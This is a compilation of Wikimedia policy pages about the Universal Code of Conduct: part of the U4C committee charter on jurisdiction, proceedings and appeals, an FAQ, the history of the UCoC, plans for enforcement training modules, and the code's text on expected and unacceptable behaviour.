Alongside providing training modules, the U4C can explore and support other ways of training, collaborating with various community stakeholders such as but not limited to the Wikimedia Foundation and affiliates.

The U4C can also share the best practices of UCoC violations and related matters and offer quality assurance and certification of UCoC training resources created by other movement stakeholders upon request.

Just like the UCoC itself defines minimums, and invites and encourages communities to build upon those minimum standards for behavior, movement stakeholders are welcome to build upon and improve the basic training resources.


4.2. JURISDICTION, PROCEEDINGS, ADJUDICATION, APPEALS

4.2.1. JURISDICTION

The U4C has jurisdiction within all Wikimedia-related online and offline spaces within the scope of its mandate as defined by the Enforcement Guidelines. The U4C will not take cases that do not primarily involve violations of the UCoC, or its enforcement. The U4C may delegate its final decision-making authority except in instances of systemic failures.

The U4C has no jurisdiction, except as noted in the relationship sections above, over: (i) official actions of the Wikimedia Foundation or its staff; (ii) Wikimedia affiliate employment relations issues governed by laws and regulations of the affiliate’s jurisdiction.

Except in instances of systemic failures, the U4C will not have jurisdiction when a NDA-signed, high-level decision-making body exists (Arbitration Committees, Affiliations Committee, Global Council, Elections Committee, Technical Code of Conduct committee, stewards), warranting effective self-governance. The U4C should also respect the movement principle of decentralization, understanding that the UCoC should be enforced at the most relevant local level possible.

The U4C retains jurisdiction over all matters heard by it, including associated enforcement processes, and may, at its sole discretion, revisit any proceeding at any time unless the issue is handed over to the Wikimedia Foundation in its capacity as platform provider due to legal issues.

4.2.1.1. SYSTEMIC FAILURES

Issues related to systemic failure can be raised by anyone and the U4C may choose to open an investigation with at least majority support. If the Foundation or a high-level decision making body requests an investigation into a systemic failure, the U4C will open an investigation. A good faith disagreement over how to interpret the UCoC is not enough to determine that a high-level decision making body has systematically failed to enforce the code.

In line with the community-approved enforcement guidelines, the U4C can take all measures it deems appropriate and proportionate to address systemic failures (e.g. project-capture) to adequately enforce the UCoC. The U4C may rely on reports by the Wikimedia Foundation and other movement groups or may request its own external report when making its decision. Sanctions for systemic failure to enforce the UCoC includes the full range of measures, up to and including the closure of wikis. A report should be published for the global community’s consideration after the adjudication.

4.2.2. PROCEEDINGS

4.2.2.1. REQUESTING ADJUDICATION REVIEW

Requests for adjudication review must be presented in the manner designated by the U4C. The U4C may accept or decline any matter at its sole discretion; it will take into account, but will not be bound by the views of the parties to the request and other informed users.

4.2.2.2. FORMS OF PROCEEDING

 * Standard proceedings: By default, hearings are public and follow the procedures published on the relevant U4C pages. Proceedings can be private if the U4C takes the view that a public proceeding might cause disproportionate harm – typically where significant privacy, harassment, or legal issues are involved – to proceeding participants, third parties, or could adversely affect the Wikimedia Foundation’s legal, technical, and public policy-related platform provider obligations. The parties will be notified of the private hearing and be given a reasonable opportunity to respond to what is said about them before a decision is made.
 * Expedited proceeding: Where the facts of a matter are substantially undisputed, the U4C may resolve the dispute by a vote without a standard proceeding.

4.2.2.3. PARTICIPATION

A member whose term expires while a case is pending may remain active on that case until its conclusion. Newly appointed members may become active on any matter before the U4C with immediate effect from the date of their appointment.

Statements may be added to case pages by any informed and interested user. The U4C may further set rules as needed for the submission of statements. Users may respond to statements about themselves and the U4C will make a good faith effort to contact any user who is the subject of a case; failure to do so may result in decisions being made without their participation. All editors are required to act according to the UCoC on U4C case pages, and may face sanctions if they fail to do so.

4.2.2.4. ADMISSIBILITY OF EVIDENCE

In all proceedings, admissible evidence includes:

 1. All edits and log entries, including deleted or otherwise hidden edits and log entries from online projects, platforms, and services within the U4C’s scope;
 2. Testimony and evidence from offline incidents as deemed appropriate by the U4C.

Evidence is admissible in all languages supported by Wikimedia Foundation platforms and services. If the U4C requires additional resources processing material received, it can coordinate with the Wikimedia Foundation as other community self-governance committees collaborating with the platform provider do. Evidence based on private communications (including, but not limited to, other websites, forums, chat rooms, IRC logs, email correspondence) is admissible only by prior consent of the U4C.

Evidence may be submitted privately, but the U4C normally expects evidence to be posted publicly in all public proceedings unless there are compelling reasons not to do so, or it has been determined the proceeding will be private. The U4C will decide whether to admit each submission of private evidence on its own merits and, if admitted, the evidence will be considered at a private hearing.

4.2.2.5. TEMPORARY INJUNCTIONS

At any time between the request for a case being made and the closure of the case, the U4C may issue temporary injunctions, restricting the conduct of the parties, or users generally, for the duration of the case.

4.2.3. ADJUDICATION

4.2.3.1. FORMAT OF DECISIONS

Decisions are written in clear, concise standard English and the primary language(s) relevant to the case at hand; usually including: (i) an outline of the salient principles, (ii) findings of fact, (iii) setting out remedies and rulings, and (iv) specifying any enforcement arrangements. Where the meaning of any provision is unclear to any U4C member, the parties, or other interested editors, it may be clarified upon request.

4.2.4. APPEALS

4.2.4.1. ADMISSIBILITY OF APPEALS

Appeals by blocked, banned, or similarly restricted individual users are usually conducted by email.

4.2.4.2. APPEAL OF DECISIONS

Any party to the case may ask the U4C to reconsider or amend a ruling, which the U4C may accept or decline at its discretion. The U4C may require a minimum time to have elapsed since the enactment of the ruling, or since any prior request for reconsideration, before reviewing it.


4.3. UCOC AND ENFORCEMENT GUIDELINES- REVIEW AND CHANGES

4.3.1. UCOC MONITORING

The U4C shall closely monitor the Foundation safety perception surveys, its own caseload trends, and feedback from community self-governance processes to identify challenges to the effective self-governance of communities to enforce the UCoC. Concerns identified shall be publicly documented on the U4C’s noticeboard, addressed as merited, or tabled during the annual UCoC & EG review.

Preceding the annual review, the U4C will complete the following:

 * Contact functionaries in our global community, including:
   * Stewards
   * ArbCom members
   * Checkusers
   * Oversighters
   * Administrators
   * Communities
 * Provide reports of any observations requiring the U4C to look into UCoC or EG-related challenges in communities. The U4C is obligated to discuss these reports for inclusion in their proposal.
 * Open a comment page on Meta-wiki available for everyone. It contains a section for any community member to report matters about how the U4C, the EG and the UCoC work as enforced. The comment page is linked in U4C communications about the annual review. The U4C shall look into comments and questions placed on that page, but is not obligated to follow-up in depth.
 * The above mentioned Meta-wiki comment page contains a second dedicated section allowing community members to share ideas for improvement and amendments. This is helpful to collect ideas from individuals and aims to be open to all voices in the community. U4C is required to read and decide if they want to adopt these ideas when drafting a proposal during the annual process.
 * The U4C should actively search and identify any new or unusual trends of unacceptable behaviors occurring in the movement. They may observe the trends, the comments of the community, and consider academic research.

4.3.2. CHANGES TO THE CHARTER, THE ENFORCEMENT GUIDELINES OR THE UCOC

Changes to the Charter, the Enforcement Guidelines or the UCoC require community approval. The U4C will organize at its sole discretion the annual review of the UCoC, the Enforcement Guidelines and the Charter. It comprises at least:

 * A feedback evaluation phase
   * Call for comment globally
   * An evaluation of comments and accumulated community sentiment from all channels
   * A knowledge from the actual state of research about our movement and Internet in general
 * A drafting phase
   * Inclusion of evaluated functionaries and community comments, internal notes from the noticeboard and knowledge from the actual state of research about our movement and Internet in general.
   * During the drafting phase there are at least three open community conversations, for timezone coverage.
   * The changed draft is published regularly during the drafting phase, depending on the U4C’s workflow either after every session or weekly.
   * The final draft is reviewed by the Wikimedia Foundations Legal Department on-wiki.
 * A voting phase
   * Votes will be cast by community members with > 60% or > 66% approval
   * The translation of the final draft preceding the vote and running and promoting the poll according to the specifications of the U4C is ensured by the Wikimedia Foundation.
   * The ballot must allow voters to vote separately on individual substantive sections.


5. GLOSSARY

Regional Distribution group: The Regional Distribution group is the group of Community elected representatives of the U4C coming from each of the 8 Wikimedia determined regions (Central and East Europe (CEE); Latin America and Caribbean; Middle East and North Africa; North America (USA and Canada); South Asia; East, Southeast Asia and Pacific (ESEAP); Sub-Saharan Africa; Western Europe).

Community at Large group: The Community at Large group is the group of the U4C Community elected representatives being active on any Wikimedia project.

CONSULTATIONS

1. How is the UCoC related to other Movement Strategy initiatives and consultations, for example the Movement Charter? The UCoC is a key initiative from the Wikimedia 2030 community conversations and strategy process. The third recommendation from the Movement Strategy discussions was to provide for safety and inclusion within the communities and creating a code of conduct was rated the highest-priority initiative of this recommendation. There have been Global Conversations being held in parallel with the Universal Code of Conduct consultations for other Movement Strategy initiatives such as the Movement Charter. 2. On what basis were the communities selected for local consultations? The communities for the Phase 1 local language consultations were selected based on several factors, including the rate of growth and the state of local conduct policies. More information on the process for Phase 1 is available here. The availability of qualified local language facilitators was also a practical consideration. Like Phase 1, numerous factors guided the selection of communities for Phase 2. The first was data on the existing enforcement infrastructure of different language Wikimedia projects with respect to local policies. The facilitators have been chosen to represent communities with varied levels of existing enforcement, so as to bring in diverse perspectives. The availability of qualified facilitators and aspirations of wide geographic coverage also played a part. 3. Has the Wikimedia Foundation announced that the UCoC will apply to all Wikimedia projects and spaces? Yes. Since the UCoC will become part of the Terms of Use, it will not be possible for individual communities to opt out of the global policy. If existing local policies or practices seem to be in contravention of the UCoC, those concerns should be raised early in the process so that the conflict can be examined and resolved. As of 2 February 2021, the Board of Trustees has formally approved the UCoC as a policy that will apply to all projects and activities in the Wikimedia movement. This scope has also been made clear since the beginning stages of the Phase 1 consultation to draft the policy, and was posted both on meta, wikimedia-l, and many individual projects. A list of the announcements to the small and medium-sized wikis is available on this page. Details of larger on-wiki consultations are available here.


TRANSLATION

4. Will the UCoC and its supporting documentation be available in all languages? The UCoC project team will work to translate all major documentation and announcements into as many languages as possible using a combination of agency and volunteer translation. This is a large effort that will take time, and we cannot do it alone. We encourage volunteers who would like to translate materials, or who would like translations made available in a new language, to email ucocprojectwikimedia.org. While it is not possible to translate all materials into all languages, we are committed to enabling broad participation in the UCoC process across languages. 5. In case of translation discrepancies or conflicts of interpretation, which language version of the draft will be considered the official version? The UCoC team has been working to publish as many translations of the UCoC policy, enforcement guidelines, and related pages, as possible. However, translations are imperfect, and we use a number of strategies (paid agency, volunteer, staff, etc.) to complete translations, which each have their own challenges with accuracy. Communities are encouraged to help us identify and correct the discrepancies, and asked to be understanding that fixing discrepancies takes time. Until the process is complete, the English version will be the official version.


ENFORCEMENT

6. What are the plans for the enforcement of the UCoC, such as who is responsible for enforcing it? As per the directives from the Foundation’s Board of Trustees (Board, or BoT), enforcement is the focus of the second phase of the project, which began after the final draft version of the UCoC was approved by the Board and announced on 2 February, 2021. This means that Wikimedia communities will determine how the UCoC will be applied, interpreted, and enforced at the local level. All affected parties and communities are encouraged to actively participate in the discussion to seek compatibility with existing community practices, policies, and procedures. Finally, the UCoC and its enforcement strategies are meant to serve as a baseline across the movement. Individual project communities are still encouraged to develop their own behavior codes on top of this effort. 7. How would a UCoC violation be handled in real life, for example, at Foundation or Wikimedia affiliate events where the Friendly Space Policy is also applicable? Which policy would take precedence? As the UCoC provides a minimal set of guidelines, local policies should always be consulted first and enacted as they apply. This is true for events the same way it is true for behavior on any Wikimedia project. The UCoC is only meant to be applied in cases where local policies or enforcement mechanisms are not sufficient to address the issues at hand. 8. Would private reporting of UCoC violations be contrary to the free and transparent Wikimedia community culture (where everyone, for example, can see the page history)? It is already the case that reports are accepted in private for a number of reasons, such as those that require the disclosure or suppression of personally-identifying information, threats of harm, and other sensitive issues. Such reports are regularly submitted to Trust and Safety/Legal, Stewards, CheckUsers, Oversighters, Arbitration Committees, and other functionaries. A significant number of participants have expressed reluctance to report harassment in public venues, as this may result in further hostility. An important consideration in Phase 2 was exploring the need to balance transparency with the duty to protect victims of harassment. 9. What kind of support would the Foundation provide to those responsible for enforcing the UCoC? The Foundation is committed to supporting the UCoC through all stages of its development: policy drafting, consultations on enforcement, and then ensuring enforcement pathways operate well. There are already some steps being taken to make sure the implementation of the UCoC is successful. This includes providing support for those who could be responsible for enforcing the UCoC. For example, the Foundation’s Community Development team has launched online training pilot programs. As we better understand community needs through our Phase 2 consultations, we will have a better understanding of the types of support to prioritize.


PERIODIC REVIEWS

10. Will there be periodic reviews and amendments of the UCoC once it is formed? If yes, who will be responsible for doing that? Yes. The Foundation’s Legal Department will host a review of the UCoC and the Enforcement Guidelines one year after ratification of the Enforcement Guidelines. Succeeding reviews may be facilitated by emerging governance structures such as those recommended by the Movement Strategy process. 11. Who will review the policies in the future if an urgent need for change arises? Like other Foundation-hosted policies, requests for urgent changes can be submitted to the Foundation’s Legal Department. The Legal Department has led community-driven amendment conversations in the past (for example, the 2014 Terms of use/Paid contributions amendment) and has a structure and process for facilitating these situations.


CONFLICT WITH LOCAL POLICIES

12. What happens if local policies are in conflict with the UCoC? After the acceptance of the UCoC by the Board, all Wikimedia communities will be encouraged to look at their existing policies to ensure they fulfill the UCoC expectations. Communities can go beyond the UCoC and develop more elaborate policies, but they should ensure that their local policies do not fall below the basic standard set by the UCoC. If needed, communities and the Foundation can work together to harmonize policies. The Foundation will be available to assist until the project is completed. 13. Will the UCoC also apply to projects that already have local policies and guidelines? The UCoC aims to create the most basic standards for conduct across the movement. Projects with well-developed policies typically meet or exceed the UCoC expectations and in general will not have to make many changes to local policies in order to adhere to the global policy. 14. Each Wikimedia project has its own behavioral guidelines and policies written by the users of that project based on their needs. Is the UCoC going to change these guidelines and policies? The UCoC is not meant to replace existing, effective behavioral standards. Rather, the UCoC will work as a basic standard for all projects, particularly those projects that have few or no existing behavioral standards. Communities can use the UCoC to develop more culturally appropriate norms or to adjust existing guidelines as needed. 15. What if UCoC does not 100% meet our community needs? The UCoC will most certainly not meet all community needs. Also, the UCoC is very likely to evolve in the future. Communities are encouraged to build their own policies on top of it. For example, the UCoC may say, “You should focus on what is best not only for you as an individual editor, but also for the Wikimedia community as a whole.” This is very broad. Many Wikimedia projects already have much more detailed policies on how to handle issues like this, such as Conflicts of Interest. If your project does not have one, such a sentence in the UCoC would be the fallback rule for any conflicts arising on this topic. But the UCoC could also be a good reminder to develop a more detailed policy around this or other topics. 16. How is the UCoC going to fit into all cultural contexts? The UCoC may not fit into all cultural contexts, but the drafters have worked to make it as inclusive as possible. The UCoC team did outreach to communities with different cultures and took their feedback. The drafting committee considered those inputs while creating the draft. If you see more cultural gaps in the draft, kindly bring that to our attention on the main talk page of the Universal Code of Conduct, and these issues may be included in the first or subsequent annual reviews.


REDUNDANCY WITH TERMS OF USE

17. Is it still necessary to have a UCoC when section 4 of the Terms of Use (ToU) covers behavioural policies such as “Refraining from Certain Activities”? Section 4 of Wikimedia Terms of Use does cover some behavioral guidelines along with content guidelines such as copyright infringement and paid contributions. However, it is not a comprehensive list. The Universal Code of Conduct aims to help communities apply Section 4 of the ToU by expanding on conduct expectations in more detail. 18. Why are we writing a new UCoC instead of rewriting Section 4 of the Terms of Use? To keep the Terms of Use readable and concise, some information is separated out into other documents. For instance, the Licensing Policy and Commons Licensing Policy are included as links. Agreeing to the Terms of Use means agreeing to those documents as well. The separation of the Universal Code of Conduct will allow it to be more detailed if necessary. It will also make it simpler to update based on our changing needs as a movement.


INVOLVEMENT OF THE WIKIMEDIA FOUNDATION

19. Why is the Wikimedia Foundation involved in this policy? The Wikimedia Foundation was requested by the Board of Trustees to support the process. On the recommendations advanced by community members in the Movement Strategy process, the UCoC was written by a committee comprised of both volunteers and Foundation staff. 20. What would be the ‘actual’ action from the Wikimedia Foundation if someone has violated the UCoC? Most violations of the UCoC will not be dealt with by the Wikimedia Foundation. They will be handled by local communities or global functionaries. Violations of the Terms of Use are currently dealt with in the same way. The exact details of enforcement will be determined following ratification of the Enforcement Guidelines. 21. Will the UCoC be subject to a vote? The main policy text of the UCoC was ratified by the Board of Trustees in February 2021, and is an active policy. The Enforcement Guidelines for the UCoC will go through a ratification process in 2023, reflecting requests for such a process in an open letter to the Board of Trustees by Wikimedia project Arbitrators in April of 2021.


IMPLEMENTATION

22. What do the UCoC Enforcement guidelines consist of? The UCoC Enforcement guidelines consist of preventive work (promoting UCoC awareness, recommending UCoC training, among others) and responsive work (detailing a process for filing, processing reported violations, providing resources for reported violations, designating enforcement actions for violations…) that are intended to help community members coordinate well together with processes that are fair and equitable across communities to provide the safest working environment for all. 23. How often will the guidelines be updated with changes? Both the policy text and guidelines will have periodic reviews, including within a year of implementation. 24. Who will oversee the UCoC? The Universal Code of Conduct Coordinating Committee, known as the U4C. The U4C will monitor reports of breaches of the UCoC and may engage in additional investigations and will take actions where appropriate. The U4C will regularly monitor and assess the state of enforcement of the Code and may suggest suitable changes to UCoC to the Wikimedia Foundation and the community for consideration. When necessary, the U4C will assist the Wikimedia Foundation in handling cases. The U4C can’t change the UCoC, handle disagreements between the Foundation and its affiliates, create rules that circumvent or disregard the UCoC, or act on any matter that doesn’t relate to the UCoC or its enforcement. 25. How will the U4C interact with other decision-making bodies such as arbitration committees? The U4C is meant to stand in as a final decision-making body where no higher level decision-making body exists (such as communities without an arbitration committee or other similar process), or a place where higher decision-making bodies forward cases. The U4C will also function as a decision making body for severe systematic issues that cannot be handled by existing enforcement structures. 26. How will the U4C be formed? The Drafting Committee has advocated for the creation of the U4C Building Committee. The U4C Building Committee will be comprised of community members that will work with the Foundation to create a process to establish the U4C.

The Universal Code of Conduct (UCoC) provides a global baseline of acceptable behavior for the entire movement without tolerance for harassment. The UCoC content, which includes the policy and the enforcement guidelines, was created in two phases, and work is currently being done to implement the UCoC policy and enforcement guidelines.


HISTORY

The Universal Code of Conduct (UCoC) is a key initiative from the Wikimedia 2030 community conversations and strategy process. Providing for safety and inclusion within the communities and creating a code of conduct was rated the highest-priority initiative of the third Movement Strategy recommendation.

The UCoC provides a global baseline of acceptable behavior for the entire movement without tolerance for harassment. The UCoC was created through a collaborative process through two phases. Phase 1 included drafting the policy. This comprised policy research (Report on Phase 1 feedback on enforcement pathways, Research in Wikipedias, and in other Wikimedia Projects), community consultations (Initial 2020 consultations) and a first drafting phase (Drafting Committee, meeting summaries, Draft consultation, Final text, change log). Phase 2 included drafting enforcement guidelines. Consultations were held (2021 on-wiki consultations, 2021 local consultations, Affiliates, Functionaries, Roundtables, Roundtable summaries). This was followed by a drafting process (Drafting Committee, Drafting committee meeting summaries, Draft guidelines review, Ratification survey, Conversation hours).

The Wikimedia Foundation Board of Trustees ratified the policy on 2 February 2021, and the community voted on the enforcement guidelines in March of 2022. The first vote indicated community support for the guidelines, with several specific improvement areas identified through comments submitted in the process (Enforcement guidelines, change log, Voting, voter information, results and voting statistics, summary of voter comments, all voter comments). The Board’s Community Affairs Committee (CAC) requested that a community-led revisions committee address some parts of the guidelines (Revisions Committee, meeting summaries, Conversation hours). This refinement process finished, and the second community led vote was held in January 2023 (Revised enforcement guidelines, comparison, voter information, results and voting statistics, report of voter comments, all voter comments). Based on the results, the Board of Trustees voted to ratify the Enforcement Guidelines on 9 March 2023.

Phase 3 was about building the U4C. It began with assembling a U4C Building Committee (U4CBC, Call for nominations, Meeting summaries). The U4CBC developed the U4C Charter (Draft charter text, discussion, Conversation hours). The charter was voted upon (Voter information, results and voting statistics, report of voter comments).

ABOUT

UCoC’s Enforcement Guidelines (EG) recommends the development of training modules to provide a common understanding of the UCoC and information for its implementation. These trainings are intended for people who want to be part of the UCoC enforcement processes, or those who want to be informed about the UCoC. The training will be set up in modules covering general information, identification of violations and support, and more complex cases and appeals. The due date for these trainings is March 2024 and will be developed with support from the Foundation.


MODULES

The EG proposes the following three modules aimed at providing community members with a comprehensive understanding of the Universal Code of Conduct (UCoC) and how it will be enforced.

 * The first module will serve to establish a shared understanding of the UCoC. In this module, participants can learn about the UCoC's purpose, how it came to be, expected enforcement, and planned available tools for reporting violations.
 * In the second module participants will learn how to identify UCoC violations, and more importantly how the reporting process works. Specifics include understanding violation types, recognizing reportable instances, knowing where and how to make reports, and handling cases within the UCoC processes.
 * The third module will look at more complex cases such as violations across multiple Wikimedia projects or long term harassment. It will also cover the appeals process. This module will be instructor-led and will be a prerequisite to joining the U4C, and is recommended for prospective U4C applicants and advanced rights holders who have signed the Access to Nonpublic Personal Data Policy.


APPROACH

The approach to developing these learning modules includes a few aspects:

 * The EG recommends that varied stakeholders should be consulted in the development of training, this includes both Foundation staff and community members. While we are working with Foundation staff, this public page and the links to the draft modules are an opportunity for the community to provide your thoughts and feedback.
 * For ease of understanding, to minimize confusion and to be able to reference back to the actual policies when doing the training, the structure and the language (i.e. terminology) of the modules have been kept close to the policy itself.
 * The emphasis on the text is to employ simple English. The primary goal is to communicate ideas and information in a clear and accessible manner, ensuring that the content is easily understandable for a broad audience. This involves using straightforward language, avoiding complex jargon or intricate sentence structures, and prioritizing clarity to facilitate comprehension. The focus on simplicity aims to enhance readability and make the text more inclusive, enabling a wider range of readers to engage with and grasp the intended message. Simple English also helps to make the modules more translatable.
 * The training material is developed with principles in mind acknowledging adult learners' unique characteristics. It's tailored for relevance and engagement, encouraging self-directed learning. Interactive quizzes prompt active participation and self-assessment, and spaces for discussions to foster collective knowledge and shared experiences.
 * While the final modules will be placed on the Learn.Wiki, we hope to gather your thoughts and work with you on the Meta pages of the respective modules. The Learn.Wiki platform is an online learning management platform for the Wikimedia movement. Through WikiLearn, learners can access online courses created for and by members of the Wikimedia movement. It is built using Open edX, an open-source learning platform.


YOUR INVOLVEMENT




HOW CAN YOU GET INVOLVED?

You can actively contribute to discussions, provide feedback on existing content, or propose new ideas. Your assistance is invaluable in enhancing translatability, making the modules accessible and relevant. If you come across a sentence that seems complex or a phrase challenging to translate, share your insights. Help us refine the language to make it more accessible and inclusive, ensuring that our message reaches a global audience.


SOME THINGS TO CONSIDER:

 * There are still some open questions relating to the EG such as how cases will be triaged from the incident response system, who the instructors of Module 3 on complex cases will be and how those will be selected, and details around the role of the U4C in enforcing the UCoC. As such, the training modules will also reflect some vagueness on these and will be improved once those questions are answered.
 * While the modules provide a baseline understanding of the UCoC and how it will be enforced, you may feel that the way it's structured or the examples used are not relevant to your context. As such, please note that the modules are just a baseline, much like the UCoC, and different communities are encouraged to develop training materials that reflect their context and needs.
 * The Meta pages will be open for comments rather than direct edits or suggestions. This approach is intentional, aiming to streamline collaboration while maintaining the integrity of the content.
 * However, should you have significant concerns or questions regarding these modules, we encourage you to utilize the talk page. This space provides for more in-depth discussions, allowing the community to collectively address and resolve any substantial issues or inquiries that may arise.
 * Finally, please refrain from discussing or commenting on disagreements around the UCoC itself.


HOW CAN YOU HELP?

 * Do you have general thoughts, comments, suggestions, questions?
 * Is there anything unclear or could be phrased differently?
 * Could a word, a sentence or paragraph be changed to make the text more translatable?
 * Do you have any ideas for making the modules more interactive?

We look forward to your input on the respective talk pages!

WHAT HAPPENS AFTER?

As noted in the EG, after the first U4C is onboarded, it will be responsible for maintaining and updating the training modules as needed. Local communities and Wikimedia Affiliates who want to provide training at their community level will get financial support from the Wikimedia Foundation to implement training. This includes support for translations.

Wikimedia project logos Simplified organizational chart of the movement, including roles and responsibilities Comprehensive organizational chart and mindmap of the Wikimedia movement (June 2023)

The Wikimedia movement is the totality of people, activities, and values which revolve around Wikimedia sites and projects:

 * a collection of values shared by individuals (freedom of speech, knowledge for everyone, community sharing, etc.);

It may not be circumvented, eroded, or ignored by Wikimedia Foundation officers or staff nor local policies of any Wikimedia project.
Per resolution by the Foundation's Board, the Universal Code of Conduct (UCoC) applies to all Wikimedia projects and spaces as well as Foundation activities, including events it hosts and events it funds or supports with other resources.

WHY WE HAVE A UNIVERSAL CODE OF CONDUCT

We believe in empowering as many people as possible to actively participate in Wikimedia projects and spaces, to reach our vision of a world in which everyone can share in the sum of all human knowledge. We believe our communities of contributors should be as diverse, inclusive, and accessible as possible. We want these communities to be positive, safe and healthy environments for anyone who joins (and wants to join) them. We are committed to ensuring that it remains so, including by embracing this Code of Conduct and revisiting for updates as needed. Also, we wish to protect our projects against those who damage or distort the content.

In line with the Wikimedia mission, all who participate in Wikimedia projects and spaces will:

 * Help create a world in which everyone can freely share in the sum of all knowledge
 * Be part of a global community that will avoid bias and prejudice, and
 * Strive towards accuracy and verifiability in all its work

This Universal Code of Conduct (UCoC) defines a minimum set of guidelines of expected and unacceptable behaviour. It applies to everyone who interacts and contributes to online and offline Wikimedia projects and spaces. This includes new and experienced contributors, functionaries within the projects, event organizers and participants, employees and board members of affiliates and employees and board members of the Wikimedia Foundation. It applies to all Wikimedia projects, technical spaces, in-person and virtual events, as well as the following instances:

 * Private, public and semi-public interactions
 * Discussions of disagreement and expression of solidarity across community members
 * Issues of technical development
 * Aspects of content contribution
 * Cases of representing affiliates/communities with external partners


1 – INTRODUCTION

The Universal Code of Conduct provides a baseline of behaviour for collaboration on Wikimedia projects worldwide. Communities may add to this to develop policies that take account of local and cultural context, while maintaining the criteria listed here as a minimum standard.

The Universal Code of Conduct applies equally to all Wikimedians without any exceptions. Actions that contradict the Universal Code of Conduct can result in sanctions. These may be imposed by designated functionaries (as appropriate in their local context) and/or by the Wikimedia Foundation as the legal owner of the platforms.


2 – EXPECTED BEHAVIOUR

Every Wikimedian, whether they are a new or experienced editor, a community functionary, an affiliate or Wikimedia Foundation board member or employee, is responsible for their own behaviour.

In all Wikimedia projects, spaces and events, behaviour will be founded in respect, civility, collegiality, solidarity and good citizenship. This applies to all contributors and participants in their interaction with all contributors and participants, without exceptions based on age, mental or physical disabilities, physical appearance, national, religious, ethnic and cultural background, caste, social class, language fluency, sexual orientation, gender identity, sex or career field. Nor will we make exceptions based on standing, skills or accomplishments in the Wikimedia projects or movement.


2.1 – MUTUAL RESPECT

We expect all Wikimedians to show respect for others. In communicating with people, whether in online or offline Wikimedia environments, we will treat each other with mutual respect.

This includes but is not limited to:

 * Practice empathy. Listen and try to understand what Wikimedians of different backgrounds want to tell you. Be ready to challenge and adapt your own understanding, expectations and behaviour as a Wikimedian.
 * Assume good faith, and engage in constructive edits; your contributions should improve the quality of the project or work. Provide and receive feedback kindly and in good faith. Criticism should be delivered in a sensitive and constructive manner. All Wikimedians should assume unless evidence otherwise exists that others are here to collaboratively improve the projects, but this should not be used to justify statements with a harmful impact.
 * Respect the way that contributors name and describe themselves. People may use specific terms to describe themselves. As a sign of respect, use these terms when communicating with or about these people, where linguistically or technically feasible. Examples include:
   * Ethnic groups may use a specific name to describe themselves, rather than the name historically used by others;
   * People may have names that use letters, sounds, or words from their language which may be unfamiliar to you;
   * People who identify with a certain sexual orientation or gender identity using distinct names or pronouns;
   * People having a particular physical or mental disability may use particular terms to describe themselves
 * During in-person meetings, we will be welcoming to everyone and we will be mindful and respectful of each other's preferences, boundaries, sensibilities, traditions and requirements.


2.2 – CIVILITY, COLLEGIALITY, MUTUAL SUPPORT AND GOOD CITIZENSHIP

We strive towards the following behaviours:

 * Civility is politeness in behaviour and speech amongst people, including strangers.
 * Collegiality is the friendly support that people engaged in a common effort extend to each other.
 * Mutual support and good citizenship means taking active responsibility for ensuring that the Wikimedia projects are productive, pleasant and safe spaces, and contribute to the Wikimedia mission.

This includes but is not limited to:

 * Mentorship and coaching: Helping newcomers to find their way and acquire essential skills.
 * Looking out for fellow contributors: Lend them a hand when they need support, and speak up for them when they are treated in a way that falls short of expected behaviour as per the Universal Code of Conduct.
 * Recognize and credit the work done by contributors: Thank them for their help and work. Appreciate their efforts and give credit where it is due.


3 – UNACCEPTABLE BEHAVIOUR

The Universal Code of Conduct aims to help community members identify situations of bad behaviour. The following behaviours are considered unacceptable within the Wikimedia movement:


3.1 – HARASSMENT

This includes any behaviour intended primarily to intimidate, outrage or upset a person, or any behaviour where this would reasonably be considered the most likely main outcome. Behaviour can be considered harassment if it is beyond what a reasonable person would be expected to tolerate in a global, intercultural environment. Harassment often takes the form of emotional abuse, especially towards people who are in a vulnerable position, and may include contacting workplaces or friends and family members in an effort to intimidate or embarrass. In some cases, behaviour that would not rise to the level of harassment in a single case can become harassment through repetition. Harassment includes but is not limited to:

 * Insults: This includes name calling, using slurs or stereotypes, and any attacks based on personal characteristics. Insults may refer to perceived characteristics like intelligence, appearance, ethnicity, race, religion (or lack thereof), culture, caste, sexual orientation, gender, sex, disability, age, nationality, political affiliation, or other characteristics. In some cases, repeated mockery, sarcasm, or aggression constitute insults collectively, even if individual statements would not.
 * Sexual harassment: Sexual attention or advances of any kind towards others where the person knows or reasonably should know that the attention is unwelcome or in situations where consent cannot be communicated.
 * Threats: Explicitly or implicitly suggesting the possibility of physical violence, unfair embarrassment, unfair and unjustified reputational harm, or intimidation by suggesting gratuitous legal action to win an argument or force someone to behave the way you want.
 * Encouraging harm to others: This includes encouraging someone else to commit self-harm or suicide as well as encouraging someone to conduct violent attacks on a third party.
 * Disclosure of personal data (Doxing): sharing other contributors' private information, such as name, place of employment, physical or email address without their explicit consent either on the Wikimedia projects or elsewhere, or sharing information concerning their Wikimedia activity outside the projects.
 * Hounding: following a person across the project(s) and repeatedly critiquing their work mainly with the intent to upset or discourage them. If problems are continuing after efforts to communicate and educate, communities may need to address them through established community processes.
 * Trolling: Deliberately disrupting conversations or posting in bad-faith to intentionally provoke.


3.2 – ABUSE OF POWER, PRIVILEGE, OR INFLUENCE

Abuse occurs when someone in a real or perceived position of power, privilege, or influence engages in disrespectful, cruel, and/or violent behaviour towards other people. In Wikimedia environments, it may take the form of verbal or psychological abuse and may overlap with harassment.

 * Abuse of office by functionaries, officials and staff: use of authority, knowledge, or resources at the disposal of designated functionaries, as well as officials and staff of the Wikimedia Foundation or Wikimedia affiliates, to intimidate or threaten others.
 * Abuse of seniority and connections: Using one's position and reputation to intimidate others. We expect people with significant experience and connections in the movement to behave with special care because hostile comments from them may carry an unintended backlash. People with community authority have a particular privilege to be viewed as reliable and should not abuse this to attack others who disagree with them.
 * Psychological manipulation: Maliciously causing someone to doubt their own perceptions, senses, or understanding with the objective to win an argument or force someone to behave the way you want.


3.3 – CONTENT VANDALISM AND ABUSE OF THE PROJECTS

Deliberately introducing biased, false, inaccurate or inappropriate content, or hindering, impeding or otherwise hampering the creation (and/or maintenance) of content. This includes but is not limited to:

 * The repeated arbitrary or unmotivated removal of any content without appropriate discussion or providing explanation
 * Systematically manipulating content to favour specific interpretations of facts or points of view (also by means of unfaithful or deliberately false rendering of sources and altering the correct way of composing editorial content)
 * Hate speech in any form, or discriminatory language aimed at vilifying, humiliating, inciting hatred against individuals or groups on the basis of who they are or their personal beliefs
 * The use of symbols, images, categories, tags or other kinds of content that are intimidating or harmful to others outside of the context of encyclopedic, informational use. This includes imposing schemes on content intended to marginalize or ostracize.

From Wikifunctions


Welcome to Wikifunctions

